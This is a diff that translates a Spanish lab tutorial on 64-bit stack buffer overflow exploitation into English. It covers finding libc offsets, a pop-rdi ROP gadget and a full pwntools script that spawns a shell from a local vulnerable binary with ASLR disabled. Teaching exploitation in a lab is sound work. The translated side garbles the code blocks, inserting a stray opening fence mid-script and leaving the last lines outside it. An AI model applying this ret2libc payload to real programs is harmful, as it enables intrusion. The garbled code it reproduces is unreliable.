@@ -1,11 +1,12 @@
-# Explicación de exploit 64 bits
 
-Este ejercicio ilustra cómo se haría una explotación en un entorno de 64 bits. 
-Importante: Se va a hacer con ASLR desactivado. En el ejercicio de format string (el reto), tendremos ASLR activo y veremos cómo hacer bypass. 
+# 64-bit Exploit Explanation
 
-## Código fuente
+This exercise illustrates how exploitation is performed in a 64-bit environment.
+Important: ASLR will be disabled. In the format string exercise (the challenge), ASLR will be enabled and we will see how to bypass it.
 
-El código fuente es: 
+## Source Code
+
+The source code is:
 
 ```c
 #include<stdio.h> 
@@ -25,14 +26,16 @@ void main(int argc, char *argv[])
 
 
 
-#### Análisis de la vulnerabilidad. 
 
-La vulnerabilidad es la típica de buffer overflow. Tendremos que encontrar el offset. Tenemos un offset de 120 bytes. 
+#### Vulnerability Analysis
+
+The vulnerability is a typical buffer overflow. We need to find the offset. The offset is 120 bytes.
 
 
-#### Búsqueda de las direcciones en libc  
 
-Tenemos que encontrar las direcciones para ejecutar  `system ("/bin/sh")`. Como nuestro ejecutable no contiene la llamada Para eso inspeccionamos la libc: 
+#### Searching for Addresses in libc
+
+We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:
 
 ```
 # ldd vuln
@@ -40,9 +43,11 @@ Tenemos que encontrar las direcciones para ejecutar  `system ("/bin/sh")`. Como 
         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
         /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
 
-# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Volcamos el desensamblado (formato Intel) en el fichero dump
+```bash
+# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump
 
-# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Buscamos /bin/sh y la encontramos en el offset 0x183cee
+# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee
+```
  183cee /bin/sh
  
 # cat dump | grep system
@@ -52,13 +57,14 @@ Tenemos que encontrar las direcciones para ejecutar  `system ("/bin/sh")`. Como 
   129ba7:       75 05                   jne    129bae <svcerr_systemerr@@GLIBC_2.2.5+0x5e> 
 
 ```
-Anotamos los siguientes offsets: 
 
-`system:  0x46ff0` 
+We note the following offsets:
+
+`system:  0x46ff0`
 
 `/bin/sh: 0x183cee`
 
-Ahora sumamos dicho offset a la dirección base en la que se carga la LIBC (la comprobamos con gdb, dado que no cambiará porque no está habilitado el ASLR): 
+Now we add these offsets to the base address where LIBC is loaded (we check it with gdb, since it will not change because ASLR is disabled):
 
 ```
 root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
@@ -93,17 +99,16 @@ Start              End                Perm      Name
 
 ```
 
-Dirección de carga de libc: 
+
+Libc load address:
 
 `libc_base = 0x00007ffff7def000`
 
+### Finding a Gadget
 
+Finally, we need to find a gadget to load the appropriate parameter into RDI for calling `system`.
 
-### Encontrando un gadget
-
-Finalmente, tenemos que encontrar un gadget para poder cargar en RDI la información correspondiente al parámetro para llamar a `system`. 
-
-Vamos instalar rop-tool. Para ello, hacemos (está en el script de install en el repositorio): 
+Let's install rop-tool. To do this (it's in the install script in the repository):
 
 ```
 # apt-get install libcapstone-dev
@@ -112,7 +117,7 @@ Vamos instalar rop-tool. Para ello, hacemos (está en el script de install en el
 # cd rop-tool; make; export PATH=$PATH:/root/rop-tool
 ```
 
-Ahora buscamos gadgets que sean útiles para cargar el valor de `/bin/sh` en RDI: 
+Now we search for gadgets that are useful for loading the value of `/bin/sh` into RDI:
 
 ```
 # rop-tool gadget libc.so.6 > gadgets
@@ -121,39 +126,41 @@ Ahora buscamos gadgets que sean útiles para cargar el valor de `/bin/sh` en RDI
  ...
 ```
 
-Por tanto, tenemos el offset del gadget que estamos buscando: 
+Therefore, we have the offset of the gadget we are looking for:
 
 `offset_pop_rdi = 0x2658e`
 
-### Desarrollo del exploit
+### Exploit Development
 
 ```python
 #!/usr/bin/python
 # coding: utf-8
 
 from pwn import *
-# Definición de las direcciones (ver arriba)
+```python
+# Definition of addresses (see above)
 libc_base = 0x00007ffff7def000
 system_addr = libc_base + 0x46ff0
 binsh_addr = libc_base + 0x183cee
 pop_rdi = libc_base + 0x2658e
 
-log.info ("system: " + str(hex(system_addr)))
-log.info ("binsh: " + str(hex(binsh_addr)))
-log.info ("pop_rdi: " + str(hex(pop_rdi)))
+log.info("system: " + str(hex(system_addr)))
+log.info("binsh: " + str(hex(binsh_addr)))
+log.info("pop_rdi: " + str(hex(pop_rdi)))
 pause()
 
-p = process ("./vuln")
+p = process("./vuln")
 
-# Creación del payload (técnica ROP)
-payload = ""
-payload += "A"*120
+# Creating the payload (ROP technique)
+payload = b""
+payload += b"A" * 120
 payload += p64(pop_rdi)
 payload += p64(binsh_addr)
 payload += p64(system_addr)
 
-# Envío del payload
+# Sending the payload
 p.sendline(payload)
+```
 p.recv()
 p.interactive()
 ```
